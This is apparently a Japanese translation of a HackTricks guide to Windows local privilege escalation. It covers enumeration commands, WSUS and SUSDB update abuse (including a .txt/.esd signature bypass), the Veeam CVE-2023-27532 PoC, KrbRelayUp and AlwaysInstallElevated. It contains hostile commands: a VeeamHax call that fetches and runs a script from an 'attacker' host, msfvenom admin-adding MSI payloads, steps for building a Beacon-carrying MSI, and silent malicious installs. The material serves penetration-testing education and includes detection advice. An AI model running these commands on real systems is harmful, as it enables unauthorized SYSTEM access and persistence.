# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows local privilege escalation の手段を探すのに最適なツール:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

このページでは、基礎となる複数のガイドから、Windows privilege escalation の一般的な方法論をまとめています。<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> 実践的な列挙手順には、コミュニティのワークショップやチェックリストの内容も取り入れています。<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> 過去の攻撃手法に関する資料には、Windows privilege escalation を扱った DerbyCon のプレゼンテーションも含まれています。<sup>[[5]](#references)</sup>

## Windows の基礎知識

### Access Tokens

**Windows の access token について知らない場合は、続ける前に次のページを読んでください:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs の詳細については、次のページを確認してください:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows の integrity level について知らない場合は、続ける前に次のページを読んでください:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows のセキュリティ制御

Windows には、**システムの列挙**や実行ファイルの実行を**妨げたり**、さらには**操作を検知したり**するさまざまな機能があります。privilege escalation の列挙を始める前に、次の**ページを読み**、これらの**防御**メカニズムをすべて**列挙**してください:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

物理アクセスがあれば、オフラインでの UEFI NVRAM の編集を、起動前の DMA と Windows の `SYSTEM` メモリパッチ適用チェーンに発展させることもできます:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / UIAccess によるサイレントな昇格

`RAiLaunchAdminProcess` を通じて起動した UIAccess プロセスは、AppInfo の secure-path チェックを回避すると、プロンプトなしで High IL を取得するために悪用できます。専用の UIAccess/Admin Protection bypass ワークフローはこちらを確認してください:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop のアクセシビリティレジストリ伝播は、任意の SYSTEM レジストリ書き込み（RegPwn）に悪用できます:<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

最近の Windows ビルドでは、特権を持つローカル NTLM 認証を再利用された SMB TCP 接続経由で反射させる、**SMB 任意ポート**経由の LPE 手法も導入されました:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## システム情報

### バージョン情報の列挙

Windows のバージョンに既知の脆弱性がないか確認してください（適用済みのパッチも確認してください）。

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### バージョン Exploits

この[サイト](https://msrc.microsoft.com/update-guide/vulnerability)は、Microsoftのセキュリティ脆弱性に関する詳細情報を検索するのに便利です。このデータベースには4,700件を超えるセキュリティ脆弱性が登録されており、Windows環境が持つ**巨大なattack surface**を示しています。

**システム上で**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — OSのビルド、インストール済みの更新プログラム、候補となるアドバイザリを一覧表示します。結果が該当するものとして扱う前に、正確な製品と後続の更新プログラムを確認してください。

バージョン固有のローカル exploit を使う場合は、OSのアーキテクチャだけでなく、**実行中のプロセスのアーキテクチャ**も確認してください。64ビット版Windowsでは、32ビットプロセスに[WOW64ファイルシステムリダイレクト](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector)が適用されます。通常、`%windir%\System32`は32ビットのシステムディレクトリに解決されますが、`%windir%\Sysnative`を使うと、そのプロセスからネイティブのシステムディレクトリにアクセスできます。このエイリアスは64ビットプロセスでは使用できません。OSのビルドや未適用KBの候補だけでは、exploit可能であるとは証明できません。実行中のビルド、インストール済みまたは後続の更新プログラム、プロセスのアーキテクチャ、exploitの前提条件を、該当する問題に関する[Microsoftのセキュリティ情報](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032)と照合してください。

**システム情報を使ってローカルで**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**ExploitのGitHubリポジトリ:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### 環境

環境変数に認証情報やJuicyな情報が保存されていませんか？

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### PowerShell の履歴

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### PowerShell Transcript ファイル

[https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)で有効にする方法を確認できます。

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` はあくまで一例です。[PowerShell transcription policy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) は通常、各ユーザーの Documents フォルダーに書き込みますが、`OutputDirectory` の設定や `Start-Transcript -OutputDirectory` によって、共有フォルダーや隠しフォルダーにファイルを出力できます。transcript を確認する前に、実際の出力先とファイルの ACL を確認してください。transcript には、認証情報を含むコマンド引数や出力が記録されている可能性があります。読み取り可能な transcript は、内容から利用可能な高権限の ID が判明し、その ID で該当する環境にログオンできる場合にのみ、手がかりになります。

### PowerShell Module Logging

PowerShell の pipeline 実行の詳細として、実行されたコマンド、コマンドの呼び出し、およびスクリプトの一部が記録されます。ただし、実行の詳細や出力結果がすべて記録されるとは限りません。

有効にするには、ドキュメントの「Transcript files」セクションの手順に従い、「Powershell Transcription」ではなく **「Module Logging」** を選択してください。

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

PowersShell のログから直近15件のイベントを表示するには、次を実行します:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

スクリプトの実行中に、すべてのアクティビティと実行内容全体が記録され、コードの各ブロックが実行時に記録されます。このプロセスにより、各アクティビティの包括的な監査証跡が保持され、フォレンジックや悪意ある動作の分析に役立ちます。実行時にすべてのアクティビティを記録することで、プロセスに関する詳細な分析情報が得られます。

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Script Block のイベントログは、Windows イベント ビューアーの次のパスにあります: **アプリケーションとサービス ログ > Microsoft > Windows > PowerShell > Operational**。\
直近20件のイベントを表示するには、次を使用します:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### インターネット設定

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### ドライブ

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

HTTP の WSUS エンドポイントは、更新メタデータの傍受を調査する手掛かりになります。悪用できるかどうかは、クライアントがその WSUS サーバーを使用しているか、攻撃者がその通信を傍受または制御できるか、そしてクライアントの更新に関する信頼設定とインストールポリシーにも左右されます。URL だけではコード実行が可能だとは判断できません。[Microsoft は WSUS メタデータに TLS を推奨しています](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus)。

まず、次のコマンドを cmd で実行して、ネットワークが SSL を使用しない WSUS 更新を利用しているか確認します:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

または、PowerShell で以下を実行します:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

次のような応答が返ってきた場合：

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

また、`HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` または `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` の値が `1` の場合です。

`UseWUServer` が `1` の場合、Windows Update は構成済みのイントラネットサービスを使用します。これは HTTP interception を行うための前提条件を満たすことを示しますが、interception、悪意ある更新プログラムの受け入れ、または昇格された権限でのインストールが可能であることを証明するものではありません。値が `0` の場合、このポリシーでは該当する構成済み WSUS endpoint は選択されません。

この脆弱性を悪用するには、[Wsuxploit](https://github.com/pimps/wsuxploit)、[pyWSUS ](https://github.com/GoSecure/pywsus) などのツールを使用できます。これらは、非 SSL の WSUS traffic に「偽の」更新プログラムを挿入する MiTM weaponized exploits scripts です。

調査内容はこちらをご覧ください。

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**レポート全文はこちら**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)。<sup>[[33]](#references)</sup>\
基本的に、このバグが悪用するのは次の欠陥です。

> ローカルユーザーの proxy を変更でき、Windows Updates が Internet Explorer の設定で構成された proxy を使う場合、[PyWSUS](https://github.com/GoSecure/pywsus) をローカルで実行して自分自身の traffic を intercept し、asset 上で昇格されたユーザーとして code を実行できます。
>
> さらに、WSUS service は現在のユーザーの設定を使用するため、そのユーザーの certificate store も使用します。WSUS hostname 用の self-signed certificate を生成し、その certificate を現在のユーザーの certificate store に追加すれば、HTTP と HTTPS の両方の WSUS traffic を intercept できます。WSUS には、certificate に対して trust-on-first-use 型の検証を実装する HSTS のような仕組みはありません。提示された certificate がユーザーによって信頼され、正しい hostname を持っていれば、service はそれを受け入れます。

この脆弱性は、ツール [**WSUSpicious**](https://github.com/GoSecure/wsuspicious)（公開され次第）を使って悪用できます。

### WSUS 管理者が制御する更新プログラム

現在の identity に WSUS server 上で更新プログラムを**公開および承認**する権限がある場合、別の攻撃経路が存在します。server の `WSUS Administrators` group に対する実効的なメンバーシップと、委任された WSUS permissions を確認し、承認済みの更新プログラムを受け取る client computer group を特定してください。[Microsoft は更新プログラムの承認に WSUS Administrator privileges を要求しており](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate)、[ローカルで公開されたコンテンツに対する署名の trust relationship についても説明しています](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29)。client は、ローカルで公開されたコンテンツの署名に使われた certificate を信頼する必要があります。これを権限昇格経路とみなす前に、候補となる更新プログラムに署名があり、受け入れられること、対象に適用可能であること、より高い権限の context でインストールされることを確認してください。HTTP の `WUServer` 値や group 名だけでは、これらの条件を満たすことにはなりません。

### SUSDB のカスタム更新プログラム悪用: `.txt`/`.esd` による未署名 payloads

これは HTTP WSUS connection の interception とは異なる trust-boundary の問題です。前提条件は、カスタム更新プログラムを公開および承認するために、**WSUS database (`SUSDB`) の stored procedures** を十分に利用できることです。実際の侵入経路の一つは、上流 WSUS computer account を `SUSDB` をホストする別の MSSQL server に relay する方法です。必要な前提条件は deployment によって異なるため、SQL administrator rights があると決めつけず、まず `EXECUTE` permissions を列挙してください。<sup>[[38]](#references)[[39]](#references)</sup>

WSUS client authentication を HTTP/8530 から LDAP、SMB、または AD CS に relay する別の攻撃経路については、[Abusing WSUS HTTP for NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8) を参照してください。

#### 更新プログラムの作成、対象設定、承認

カスタム更新プログラムの workflow では、制限付きの publishing API として正規の WSUS procedures を使用します。重要な state transition は次のとおりです。<sup>[[38]](#references)</sup>

| Stage | Relevant stored procedures |
| --- | --- |
| 更新プログラムの metadata をインポート | `spImportUpdate` |
| prerequisite、localized、extended XML fragments を保存 | `spSaveXMLFragment` |
| content digest を攻撃者が制御する URL に関連付け | `spSetBatchURL` |
| computer group を列挙/作成し、client を追加 | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| その group に対するインストールを承認 | `spDeployUpdate` with `@actionID = 0` and `@isAssigned = 1` |

ファイル名、digests、size、`CommandLineInstallation` handler は、インポートした metadata/fragments 全体で一致している必要があります。content URL と対象 group を設定した後の最終的な承認処理は、次のようになります。例の GUID を再利用せず、新しい update、group、deployment identifiers を使用してください。<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### 拡張子を利用した署名バイパス

WSUS は通常、任意の未署名実行可能コンテンツを拒否します。しかし、`C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` 内の .NET `VerifyFile` 処理では、渡されたファイル名が `.txt` または `.esd` で終わる場合、証明書チェックのフラグが false に設定されます。そのため、バイト列がテキストまたは正規の ESD イメージであることを事前に確認せずに、`CheckCertificateSignature` がスキップされます。したがって、たとえば `payload.exe.txt` という名前を付けた未変更の PE はコンテンツ検証を通過し、その後、更新プログラムのコマンドラインインストールハンドラーによって起動される可能性があります。これはポリシーと型の混同によるバグであり、署名の偽造ではありません。<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### BITS互換のステージングと自動化

`spDeployUpdate`を呼び出すと、WSUSが登録済みコンテンツを取得します。配信元はBITSのHTTP要件を満たす必要があります。到達可能なURLだけでは不十分で、転送では最初に`HEAD`/`GET`を行い、バイト範囲リクエストを使用します。Rangeをサポートしないサーバーでは、BITSにRangeプロトコルヘッダーが必要だと示すWSUS同期の`EventId=364`が発生します。<sup>[[39]](#references)</sup>

調査用PoCの[NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)は、import/fragment/URL/group/deploymentの一連の処理に必要なSQLを生成し、それを実行するための改変版MSSQL clientを含み、コンテンツのステージング用に`BitsWebServer.py`を提供します。許可されたラボでの最小限の実行例は次のとおりです。<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### 自動実行と再試行による永続化

クライアント側の動作はポリシーに依存します。`Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates` のオプション `4 - Auto download and schedule install` を設定すると、承認済みの更新プログラムがダウンロードされ、設定されたスケジュールに従ってインストールされます。ユーザーが手動で選択する必要はありません。テストでは、更新プログラムが失敗／未完了のままになった payload は、callback プロセスの終了後すぐに再度提示されました。そのため、再試行動作が繰り返し実行される永続化につながる可能性があります。ただし、クライアントに更新失敗の状態が表示されるため、目立ちます。<sup>[[39]](#references)</sup>

#### 検知とハードニングの観点

この一連の攻撃で有用なサーバー側およびクライアント側の調査ポイントは次のとおりです。<sup>[[39]](#references)</sup>

- `SUSDB` における `spCreateTargetGroup`、`spSetBatchURL`、`spDeployUpdate` の実行を監査します。新しいターゲットグループ、外部のコンテンツ配信元、`.txt`／`.esd` の更新 payload、および想定外のプリンシパル（特にコンピューターアカウント以外）によるデプロイを調査します。
- `C:\Program Files\Update Services\LogFiles` を確認し、`ContentSyncAgent`、`FileVerified`、スペルミスのある `FileVerficationFailed`、および `EventId=364` を探します。拡張子を信用せず、検証ログを payload の拡張子とコンテンツのマジックナンバーと照合します。
- Windows Update のインストールが繰り返し失敗／再試行しているケースや、`.txt` または `.esd` という名前のコンテンツからの PE 実行、想定外の子プロセス／ネットワーク動作をハントします。
- サポートされている場合はデータベースサービスで Extended Protection for Authentication を必須にし、データベースへのネットワークアクセスを WSUS サーバーと認可された管理システムに制限します。カスタム更新プログラム用プロシージャの `EXECUTE` 権限を最小限にし、監査します。

## サードパーティ製自動更新プログラムと Agent IPC（local privesc）

多くのエンタープライズエージェントは、localhost の IPC サーフェスと特権付きの更新チャネルを公開しています。登録先を攻撃者のサーバーに誘導でき、updater が不正な root CA や弱い署名者チェックを信頼する場合、ローカルユーザーは悪意のある MSI を送り込み、SYSTEM サービスにインストールさせることができます。一般化した手法（Netskope stAgentSvc の一連の攻撃をベースにしたもの – CVE-2025-0309）はこちらを参照してください。


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532（TCP 9401 経由の SYSTEM）

Veeam Backup & Replication と Cloud Connect は、デフォルトで **TCP/9401** のコアバックアップサービスを使用します。[Veeam のアドバイザリ](https://www.veeam.com/kb4424) では、バックアップネットワークの境界内において、暗号化された構成データベースの認証情報が認証なしで開示される問題が説明されています。また、別の公開 PoC では **NT AUTHORITY\SYSTEM** としてコマンドを実行する経路が示されています。<sup>[[12]](#references)</sup> サービスは localhost 以外にもバインドする場合があるため、実際のアドレスと PID を確認してください。

- **Recon**: TCP/9401 が `Veeam.Backup.Service.exe` に属していることを確認し、インストール済みの製品とパッチのメタデータを調べます。`netstat -ano | findstr 9401` と `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` は手掛かりにはなりますが、完全なパッチ確認ではありません。
- **修正済みの最低バージョン**: Veeam によると、最初の修正済みリリースは **11a build 11.0.1.1261 P20230227** と **12 build 12.0.0.1420 P20230223** です。これより前のリリースは影響を受けます。4 部構成のファイルバージョンだけでは、同じビルド番号に対する未パッチのベースビルドと後続パッチを区別できません。境界となるビルドを修正済みと判断する前に、[ベンダーのビルド履歴](https://www.veeam.com/kb2680)でパッチ識別子を確認してください。
- **Exploit**: `VeeamHax.exe` などの PoC と必要な Veeam DLL を同じディレクトリに配置し、ローカルソケット経由で SYSTEM payload をトリガーします。

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

引用された PoC は、追加の前提条件が満たされる場合に SYSTEM としてコマンドを実行できることを示しています。ベンダーのアドバイザリでは、認証情報の漏えいに関する問題が説明されています。
## KrbRelayUp

ローカル Kerberos relay は、適切な COM server が認証を行い、relay された principal が対象オブジェクトへの書き込み権限を持つ場合、低権限のログオンから特権ディレクトリへの書き込みに至る可能性があります。[KrbRelay のドキュメント](https://github.com/cube0x0/KrbRelay) では、RBCD と `msDS-KeyCredentialLink`（shadow-credential）の LDAP 書き込みの両方を扱っており、KrbRelayUp はこれらの経路の一部を自動化します。RBCD のチェーンには該当する委任と対象オブジェクトへの権限が必要です。一方、shadow-credential のチェーンには key-credential の書き込み権限と、証明書認証経路をサポートする KDC が必要です。どちらの経路も、ドメインへの参加だけで成立するわけではありません。

実際の DC の [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) と [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding) のポリシー、relay される ID のオブジェクト ACL、選択された COM class の認証レベルと偽装レベルを確認してください。呼び出し元のログオンタイプと認証情報のコンテキストも重要です。WinRM セッションは、対話型ログオンや新しい資格情報を使ったログオンとは異なる動作をする場合があります。ファイアウォール/OXID のルーティングやインストール済みの更新プログラムによっても結果が変わることがあります。緩いポリシーや一致する ACL はレビュー対象として扱ってください。受動的な列挙で COM coercion、relay 認証、ディレクトリへの書き込みを実行してはいけません。マシンアカウントの shadow credential からマシンチケットを取得できる可能性があり、そのアカウントに必要なディレクトリ複製権限がある場合に限り、別途 DCSync へ進める可能性があります。

[**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) で **exploit を探してください**

攻撃の流れについては、[https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup> を確認してください。

## AlwaysInstallElevated

これら 2 つのレジストリキーが**有効**（値が **0x1**）になっている**場合**、あらゆる権限のユーザーが `*.msi` ファイルを NT AUTHORITY\\**SYSTEM** として**インストール**（実行）できます。

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

meterpreter session があれば、module **`exploit/windows/local/always_install_elevated`** を使ってこの手法を自動化できます。

### PowerUP

power-up の `Write-UserAddMSI` コマンドを使うと、権限昇格用の Windows MSI バイナリを現在のディレクトリに作成できます。このスクリプトは、ユーザー／グループの追加を促すプリコンパイル済み MSI インストーラーを書き出します（そのため、GIU アクセスが必要です）：

```
Write-UserAddMSI
```

作成した binary を実行するだけで、privilege escalation できます。

### MSI Wrapper

この tools を使って MSI wrapper を作成する方法は、この tutorial を読んでください。**command lines** を**実行**したい**だけ**の場合は、「**.bat**」ファイルを wrapper にできることに注意してください。


{{#ref}}
msi-wrapper.md
{{#endref}}

### WIX で MSI を作成


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Visual Studio で MSI を作成

- Cobalt Strike または Metasploit を使って、新しい Windows EXE TCP payload を `C:\privesc\beacon.exe` に**生成**します。
- **Visual Studio** を開き、**Create a new project** を選択して、検索ボックスに「installer」と入力します。**Setup Wizard** プロジェクトを選択し、**Next** をクリックします。
- **AlwaysPrivesc** のようにプロジェクト名を付け、場所に **`C:\privesc`** を指定し、**place solution and project in the same directory** を選択して、**Create** をクリックします。
- 手順 3/4（含めるファイルの選択）が表示されるまで **Next** をクリックします。**Add** をクリックし、先ほど生成した Beacon payload を選択します。その後、**Finish** をクリックします。
- **Solution Explorer** で **AlwaysPrivesc** プロジェクトを選択し、**Properties** で **TargetPlatform** を **x86** から **x64** に変更します。
  - **Author** や **Manufacturer** など、インストールしたアプリをより正規のものに見せるために変更できるプロパティもあります。
- プロジェクトを右クリックし、**View > Custom Actions** を選択します。
- **Install** を右クリックし、**Add Custom Action** を選択します。
- **Application Folder** をダブルクリックし、**beacon.exe** ファイルを選択して **OK** をクリックします。これにより、installer の実行直後に beacon payload が実行されます。
- **Custom Action Properties** で、**Run64Bit** を **True** に変更します。
- 最後に、**build** します。
  - `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` という警告が表示された場合は、platform を x64 に設定したことを確認してください。

### MSI Installation

悪意のある `.msi` ファイルを**バックグラウンドで**実行するには:

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

この脆弱性の exploit には、次を使用できます: _exploit/windows/local/always_install_elevated_

## Antivirus and Detectors

### Audit Settings

これらの設定によって何が**ログ記録される**かが決まるため、注意してください。

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwardingでは、ログの送信先を確認しておくとよいでしょう。

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** は、ドメインに参加しているコンピューターの**ローカル Administrator パスワードを管理**するために設計されており、各パスワードが**一意で、ランダムに生成され、定期的に更新される**ようにします。これらのパスワードは Active Directory 内に安全に保存され、ACL によって十分な権限を付与されたユーザーのみがアクセスできます。これにより、許可されたユーザーはローカル管理者のパスワードを確認できます。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

有効になっている場合、**平文のパスワードは LSASS**（Local Security Authority Subsystem Service）に保存されます。\
[**このページの WDigest に関する詳細情報**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

**Windows 8.1** 以降、Microsoft は Local Security Authority (LSA) の保護を強化し、信頼されていないプロセスによる**メモリの読み取り**やコードの注入を**ブロック**して、システムのセキュリティをさらに高めました。\
[**LSA Protection の詳細はこちら**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** は **Windows 10** で導入されました。その目的は、pass-the-hash 攻撃などの脅威からデバイスに保存されている認証情報を保護することです。[**Credential Guard の詳細はこちらをご覧ください。**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### キャッシュされた資格情報

**ドメイン資格情報**は**Local Security Authority**（LSA）によって認証され、オペレーティングシステムのコンポーネントによって利用されます。ユーザーのログオンデータが登録済みのセキュリティパッケージによって認証されると、通常、そのユーザーのドメイン資格情報が確立されます。\
[**キャッシュされた資格情報の詳細はこちら**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## ユーザーとグループ

### ユーザーとグループの列挙

自分が所属しているグループに、興味深い権限がないか確認しましょう。

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### 特権グループ

**特権グループに所属している場合、権限昇格が可能なことがあります**。特権グループと、それを悪用して権限昇格する方法についてはこちらをご覧ください。


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### トークン操作

このページで**トークン**について**詳しく学べます**：[**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens)。\
以下のページで、**興味深いトークン**とその悪用方法について学んでください。


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### ログインユーザー / セッション

```bash
qwinsta
klist sessions
```

### ホームフォルダー

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### パスワードポリシー

```bash
net accounts
```

### クリップボードの内容を取得する

```bash
powershell -command "Get-Clipboard"
```

## 実行中のプロセス

### ファイルとフォルダーのアクセス許可

まず、プロセスを一覧表示する際は、**プロセスのコマンドラインにパスワードが含まれていないか確認してください**。\
**実行中のバイナリを上書きできるか**、またはバイナリのフォルダーへの書き込み権限があるかを確認し、[**DLL Hijacking attacks**](dll-hijacking/index.html)を悪用できる可能性を調べてください。

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

